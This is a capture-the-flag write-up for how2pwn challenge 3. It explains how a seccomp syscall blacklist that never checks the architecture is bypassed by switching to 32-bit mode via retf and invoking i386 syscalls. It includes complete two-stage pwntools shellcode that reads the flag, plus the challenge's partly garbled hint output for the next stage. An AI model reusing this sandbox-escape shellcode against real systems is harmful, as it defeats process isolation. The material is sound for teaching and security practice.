# how2pwn - Challenge 3

Categories: Pwn

**Tags:** pwn, shellcode, PIE shellcode, 2-stage shellcode, pwntools `shellcraft`, seccomp

## Takeaways

- `seccomp-tools dump <binary>` actually runs the target to gather the seccomp constrains and dump them.
- [Elaborate guide to seccomp filters](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html)
- How to jump to 32-bit assembly from 64-bit assembly (also make sure your pointers (e.g. `rsp`) fit in 32 bits.)
- The three ways to invoke syscalls:
  - When you invoke the `syscall` instruction, `do_syscall_64` handles it:
    - With syscall `nr <  0x40000000`: `do_syscall_x64` handles it and uses the table found in `<asm/syscalls_64.h>`. Uses ABIs `common` and `64` and table [syscall_64.tbl](https://elixir.bootlin.com/linux/v5.15.33/source/arch/x86/entry/syscalls/syscall_64.tbl).
    - With syscall `nr >= 0x40000000`: `do_syscall_x32` handles it and uses the table found in `<asm/syscalls_x32.h>`. Uses ABIs `common` and `x32` and table [syscall_64.tbl](https://elixir.bootlin.com/linux/v5.15.33/source/arch/x86/entry/syscalls/syscall_64.tbl).
  - When you invoke the `int 0x80` instruction, `do_int80_syscall_32` handles it and uses the table found in `<asm/syscalls_32.h>`. Uses ABI `i386` and table [syscall_32.tbl](https://elixir.bootlin.com/linux/v5.15.33/source/arch/x86/entry/syscalls/syscall_32.tbl).
  - The `common` entries are for both the `64` and `x32` ABI.
  - These `.h` files are generated only after compiling the kernel.
- Using `pwnlib.shellcraft` to create shellcode

## Solution

Let's take a look at the source code:

```c
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>
#include <stddef.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
void panic(char *s){
    puts(s);
    _exit(1);
}
void checkin(){ 
    // Solved the previous challenge, and find the ticket in "/flag"
    char real_ticket[0x30] = {0};
    char your_ticket[0x30] = {0};
    int f = open("./ticket",0);
    if(f<0)
        panic("[-] Fail to open tickect");
    read(f,real_ticket,0x20);
    read(0,your_ticket,0x20);
    close(f);
    if(strncmp(real_ticket,your_ticket,0x20))
        panic("[-] Wrong Ticket");
    return ; 
}
void init(){
    fclose(stderr);
    setvbuf(stdin,  0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    checkin();
}
void sandbox(){
    // This sandbox forbids lots of syscalls so you can't open the flag! 
    struct sock_filter filter[] = {
    	// BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
		// BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, 0x40000000 , 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_creat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fork, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_vfork, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_clone, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_kill, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_tkill, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_tgkill, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    // set no_new_privs
    int ret = 0 ; 
    ret = syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS, 1,0,0,0);
    if(ret!=0)
        panic("[-] PR_SET_NO_NEW_PRIVS FAIL");
    // Apply the filter. 
    ret = syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,0,&prog);
    if(ret!=0)
        panic("[-] SECCOMP_SET_MODE_FILTER FAIL");
    puts("[+] Sandbox On");
}
int main(){
    init();
    char buf[0x100]; 
    puts("Enter your shellcode: ");
    read(0, buf, 0x100);
    void (* p )(); 
    p = (void (*)())buf;
    sandbox();
    p();
    return 1;
}
```

```bash
nikos@ctf-box:~/how2pwn$ checksec --file=./public/bin/all/chal3
[*] '~/how2pwn/public/bin/all/chal3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
nikos@ctf-box:~/how2pwn$ readelf --wide --segments ./public/bin/all/chal3 | grep -ie RWE
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
```

As we can see, in order to solve this challenge we need to first have the ticket from challenge2: `8e7bd9e37e38a85551d969e29b77e1ce`. Aside from that, this challenge is identical to challenge1, except that the `sandbox()` function is now invoked before our shellcode. So, let's focus on the `sandbox()` function and try to understand it.

As we can see, `sandbox()` sets up a seccomp filter that blacklists certain system calls. Now, a blacklist is much easier to find a bypass for it than a whitelist. Let's also run the program through [seccomp-tools](https://github.com/david942j/seccomp-tools) to dump the constraints in a more friendly UI:

```bash
nikos@ctf-box:~/how2pwn$ seccomp-tools dump ./public/bin/all/chal3
8e7bd9e37e38a85551d969e29b77e1ce
Enter your shellcode:
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0005
 0004: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
 0006: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0007: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0009
 0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0009: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0011
 0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0011: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0013
 0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0013: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0015
 0014: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0015: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0017
 0016: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0017: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0019
 0018: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0019: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0021
 0020: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0021: 0x15 0x00 0x01 0x000000c8  if (A != tkill) goto 0023
 0022: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0023: 0x15 0x00 0x01 0x000000ea  if (A != tgkill) goto 0025
 0024: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Here are our observations:

* According to the [man page](https://man7.org/linux/man-pages/man2/seccomp.2.html), to invoke `syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER)`, we first need to have invoked `prctl(PR_SET_NO_NEW_PRIVS, 1)`. So, that's why the source code is invoking it. Otherwise, the `SECCOMP_SET_MODE_FILTER` operation fails.
* The filter prevents invoking system calls via the x32 ABI as it checks if `sys_number` is less than `0x40000000`. (Relevant kernel sources: [[1](https://elixir.bootlin.com/linux/v6.1.2/source/arch/x86/entry/common.c#L80c)], [[2](https://elixir.bootlin.com/linux/v6.1.2/source/arch/x86/entry/common.c#L56)], [[3](https://elixir.bootlin.com/linux/v6.1.2/source/arch/x86/include/uapi/asm/unistd.h#L13)])
* The filter does **not** check the architecture. This means that we can bypass this seccomp filter using the 32-bit x86 syscall numbers.

In order to invoke 32-bit x86 syscalls, we need to invoke `int 0x80` and use the i386 syscall ABI. [We can do this this from 64-bit code](https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code), however our life will become complicated as our pointers are not 32-bit. Instead, we will first switch to 32-bit assembly and then invoke `int 0x80` with the syscall number in `eax`. But how can execute 32-bit assembly in the first place since our process is executing 64-bit assembly?

We will use the `retf` instruction to switch from 64-bit assembly to 32-bit. According to the [docs of `retf`](https://www.felixcloutier.com/x86/ret.html)

> `retf`: Opcode `CB` - Far return to calling procedure.
>
> Far return — A return to a calling procedure located in a different segment than the current code segment, sometimes referred to as an inter-segment return. When executing a far return, the processor pops the return instruction pointer from the top of the stack into the EIP register, then pops the segment selector from the top of the stack into the CS register. The processor then begins program execution in the new code segment at the new instruction pointer.

In Linux, when we are executing 64-bit code in the userland, then the `cs` register has the value `0x33` and when we are executing 32-bit code in the userland, then the `cs` register has the value `0x23` ([source](https://elixir.bootlin.com/linux/v6.1.2/source/arch/x86/include/asm/segment.h#L214)). This is all you need to know to perform the switch from 64-bit to 32-bit and vice-versa. However, if you want to know more about segments (and if you are into that thing - ew!), you can read more about it here [[1](http://blog.rewolf.pl/blog/?p=102), [2](https://nixhacker.com/segmentation-in-intel-64-bit/), [3](https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html)].

So, back to our shellcode. We will again use a 2-stage payload.

Stage 1 will perform the following things:

1. Invoke `mmap(0xcafe0000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED)` to allocate memory in 32-bit address. In this area we will place our 2nd stage as `eip` will need to point to a 32-bit address. The same memory area will also serve as our stack, i.e. we will also point there `esp`.
2. Invoke `read(0xcafe0000)` to read the 2nd stage 32-bit payload.
3. Use `retf` to jump to the 2nd stage 32-bit payload.

The `mmap` and `read` system calls are not blacklisted above so stage1 will successfully pass the seccomp filter.

Stage 2 then will then use the `open` syscall from the i386 ABI, which corresponds to syscall number 2 and is not banned, to open the flag file and dump it. Attempting to spawn a shell will probably not work as even if we `execve` or `fork`, the new process will inherent the seccomp filter.

So, here are our payloads:

```python
def craft_shellcode_stage1():
    shellcode = asm('''
    // void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    // unsigned long mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff);
    xor rax,rax
    mov al,  9
    mov edi, 0xcafe0000 
    mov rsi, 0x2000
    mov rdx,0x7  /* RWX */
    mov r10,0x32 /* MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED */
    xor r8,r8
    xor r9,r9
    syscall

    // eax = 0xcafe0000
    // ssize_t read(unsigned int fd, char __user *buf, size_t count)
    xor rdi,rdi
    mov rsi, rax
    mov rdx, 0x1000
    mov eax, 0
    syscall

    // jump to 32-bit assembly via `retf`
    mov eax, 0xcafe0000
    mov ebx, 0x23
    sub rsp, 8
    mov dword ptr [rsp], eax
    mov dword ptr [rsp+4], ebx
    ''')
    shellcode += b'\xcb' # retf so that we switch processor mode to 32-bit.

    padded_shellcode = shellcode + b'\x90'*(0x100 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x100)
    return padded_shellcode

def craft_shellcode_stage2():
    # pwnlib.shellcraft.i386.linux.sh() will not work because of the inherited seccomp filter.
    # We get SIGSYS, which is how seccomp violating processes get killed

    with context.local(arch='i386', bits=32):
        flag_file = '/flag' if args['REMOTE'] else './public/bin/flag'
        shellcode = asm(
            '''
            mov     esp, 0xcafe1000
            xor     edx, edx /* O_RDONLY */
            ''' +
            pwnlib.shellcraft.i386.linux.cat(flag_file)
        )
    
    padded_shellcode = shellcode + b'\x90'*(0x2000 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x2000)
    return padded_shellcode
```

So, let's send the above payload to the remote and get the ticket for the next challenge!

````bash
# Stage 3

(3/4)
There is only one challege left. Good luck!

# Ticket
7a01505a0cfefc2f8249cb24e01a2890


## Hints

```py
from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
debug = 0
if debug:
    p = process("./chal4")
else:
    p = remote("how2pwn.chal.csaw.io",60004)
    # p = remote("0.0.0.0",60004)
with open("./ticket4",'r') as f:
    ticket = f.read().strip()
p.send(ticket)

# This challeneg only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit
# 1. You can find a similar challenge here: https://n132.github.io/2022/07/04/S2.html.
# 2. After reading the article, I pretty sure you know the solution.
# 3. Implement it in shellcode
# 4. For debugging, you may need this: https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
# 5. SECCOMP_IOCTL_NOTIF_SEND == 0xC0182101 & SECCOMP_IOCTL_NOTIF_RECV==0xc0502100
# 6. Memory dump while calling
# syscall(317,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER ,&exp_prog);
# [-------------------------------------code-------------------------------------]
#    0x55555555545b <main+626>:    mov    esi,0x1
#    0x555555555460 <main+631>:    mov    edi,0x13d
#    0x555555555465 <main+636>:    mov    eax,0x0
# => 0x55555555546a <main+641>:    call   0x5555555550a0 <syscall@plt>
#    0x55555555546f <main+646>:    mov    DWORD PTR [rbp-0x118],eax
#    0x555555555475 <main+652>:    cmp    DWORD PTR [rbp-0x118],0x3
#    0x55555555547c <main+659>:    jne    0x5555555555d1 <main+1000>
#    0x555555555482 <main+665>:    mov    edi,0x39
# Guessed arguments:
# arg[0]: 0x13d
# arg[1]: 0x1
# arg[2]: 0x8
# arg[3]: 0x7fffffffe4e0 --> 0x4
# [------------------------------------stack-------------------------------------]
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# [------------------------------------------------------------------------------]
# Legend: code, data, rodata, value
# 0x000055555555546a in main ()
# gdb-peda$ stack 30
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# 0064| 0x7fffffffe500 --> 0x2
# 0072| 0x7fffffffe508 --> 0x0
# 0080| 0x7fffffffe510 --> 0x400000020
# 0088| 0x7fffffffe518 --> 0xc000003e00010015
# 0096| 0x7fffffffe520 --> 0x7fc0000000000006
# 0104| 0x7fffffffe528 --> 0x7fff000000000006
# 0112| 0x7fffffffe530 --> 0x20 (' ')
# 0120| 0x7fffffffe538 --> 0x13d01000015
# 0128| 0x7fffffffe540 --> 0x7fff000000000006
# 0136| 0x7fffffffe548 --> 0x3901000015
# 0144| 0x7fffffffe550 --> 0x7fff000000000006
# 0152| 0x7fffffffe558 --> 0x1001000015
# 0160| 0x7fffffffe560 --> 0x7fff000000000006
# 0168| 0x7fffffffe568 --> 0x3c01000015
# 0176| 0x7fffffffe570 --> 0x7fff000000000006
# 0184| 0x7fffffffe578 --> 0x7ff0000000000006
# 0192| 0x7fffffffe580 --> 0x0
# END


context.arch = 'amd64'
shellcode = f'''
    mov esp,0xcafe800
    mov rsi,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx, {attacking rule2, hint 6}
    push rbx
    mov rbx, {attacking rule3, hint 6}
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx
    mov rdx,rsp
    mov rax, {syscall num}
    mov rdi,1
    syscall

    mov r8,rax
    mov rax, {syscall num}
    syscall

    cmp rax, {compare rax to a number to judge if it's the child process}

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx, 0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    mov rax,{syscall number}
    mov rdi,r8
    mov rsi,{The option number}
    mov rdx,0xcafec00
    syscall

copy_id_of_resp:
    mov rax, 0xcafec[DEBUG] Received 0xf8 bytes:
    b'00\n'
    b'    mov rbx, qword ptr[rax]\n'
    b'    add al,0x50\n'
    b'    mov qword ptr[rax], rbx\n'
    b'set_flags_of_resp:\n'
    b'    add al,0x14\n'
    b'    mov rbx,1\n'
    b'    mov dword ptr[rax], ebx\n'
    b'resp:\n'
    b'    xor rax,rax\n'
    b'    mov al,  {syscall number}\n'
    b'    mov rdi, {A file descriptor}\n'
    b'    mov esi'
00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    xor rax,rax
    mov al,  {syscall number}
    mov rdi, {A file descriptor}
    mov esi[*] Got EOF while reading in interactive
````

So the ticket is `7a01505a0cfefc2f8249cb24e01a2890`
